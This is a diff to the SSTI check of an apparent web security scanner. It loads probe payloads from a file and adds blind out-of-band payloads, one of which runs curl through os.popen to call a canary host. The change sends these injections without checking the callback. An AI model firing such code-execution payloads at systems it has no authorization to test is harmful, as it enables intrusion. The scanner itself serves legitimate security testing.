@@ -3,9 +3,9 @@ from typing import List
 from scanner.core.scan_result import Finding, Severity
 from scanner.core.crawler import CrawlResult
 from scanner.utils.http import get_url_params, inject_url_param, fetch
+from scanner.utils.payloads import load_payloads
 
-# (payload, expected_result, engine_hint)
-PAYLOADS = [
+_HARDCODED = [
     ("{{7*7}}", "49", "Jinja2/Twig"),
     ("${7*7}", "49", "Freemarker/Thymeleaf"),
     ("#{7*7}", "49", "Pebble/Spring EL"),
@@ -17,11 +17,40 @@ PAYLOADS = [
     ("{{self}}", "<TemplateReference", "Jinja2 (self ref)"),
 ]
 
+def _get_payloads() -> List[tuple]:
+    data = load_payloads("ssti")
+    if data and isinstance(data.get("payloads"), list):
+        try:
+            return [(p["payload"], p["expected"], p["engine"]) for p in data["payloads"]]
+        except (KeyError, TypeError):
+            pass
+    return _HARDCODED
 
-def test(page: CrawlResult, client: httpx.Client) -> List[Finding]:
+# (payload, expected_result, engine_hint)
+PAYLOADS = _get_payloads()
+
+
+def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
     findings = []
     _test_url_params(page, client, findings)
     _test_forms(page, client, findings)
+
+    # Blind SSTI via OOB HTTP callback (Jinja2/Twig can make network requests)
+    if oob and not findings:
+        canary = oob.get_canary()
+        oob_payloads = [
+            f"{{% import 'os' %}}{{% set _ = os.popen('curl http://{canary}/ssti').read() %}}",
+            f"#{{\"http://{canary}/ssti\".toURL().text}}",
+        ]
+        from scanner.utils.http import get_url_params, inject_url_param
+        params = get_url_params(page.url)
+        for param_name in params:
+            for payload in oob_payloads:
+                try:
+                    client.get(inject_url_param(page.url, param_name, payload), timeout=5)
+                except Exception:
+                    pass
+
     return findings
 
 
